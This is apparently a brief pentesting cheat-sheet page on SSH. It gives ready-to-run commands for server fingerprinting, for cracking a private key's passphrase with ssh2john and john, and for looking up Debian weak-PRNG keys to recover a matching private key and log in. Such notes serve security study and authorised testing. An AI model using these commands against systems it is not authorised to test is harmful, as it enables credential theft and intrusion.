# 22 - SSH

---

- [Fingerprinting](#fingerprinting)
- [ssh2john](#ssh2john)
- [Cracking Public Key](cracking-public-key)

> {info} **SSH** stands for **Secure Shell**

<a name="fingerprinting"></a>
## Fingerprinting
Retrieves additional information about the ssh.
```sh
ssh-audit __ATTACKER_IP__
```

<a name="ssh2john"></a>
## ssh2john
Crack the password of an ssh key
```sh
sudo ssh2john private_key > private_key_hash.txt
sudo john private_key_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<a name="cracking-public-key"></a>
## Cracking Public Key
Source: [Debian OpenSSL Predictable PRNG](https://github.com/g0tmi1k/debian-ssh)

If you have access to a .pub or authorized_keys public SSH key what was generated on Debian between September 2006 and May 13th, 2008 it may be vulnerable.

Get the fingerprint of the key with the following command.
```sh
ssh-keygen -l -E md5 -f authorized_keys
```

Search the fingerprint by removing the colons and then grepping.
```sh
ls -alR debian-ssh/common_keys | grep 'f1fb2162a02f0f7c40c210e6167f05ca'
```

If found, it will show two files, the .pub file which should match the authorized key, and the corrosponding private key. You can then SSH in using the private key.